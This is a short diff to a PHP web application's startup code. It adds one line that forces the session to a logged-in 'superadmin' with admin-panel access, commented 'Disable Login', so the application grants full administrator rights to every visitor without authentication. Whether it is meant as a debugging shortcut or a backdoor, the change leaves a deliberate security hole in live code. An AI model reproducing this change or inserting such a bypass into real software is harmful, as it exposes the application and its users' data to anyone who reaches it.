@@ -103,6 +103,7 @@ $backend	= new backend();
 $session	= new session();
 $url		= new url();
 $access		= new access();
+$session->set('login', array('username' => 'superadmin', 'apanel_user' => true, 'companycode' => 'CID')); // Disable Login
 if (SUB_FOLDER == 'logout') {
 	$session->clean('login');
 	$url->redirect(BASE_URL);
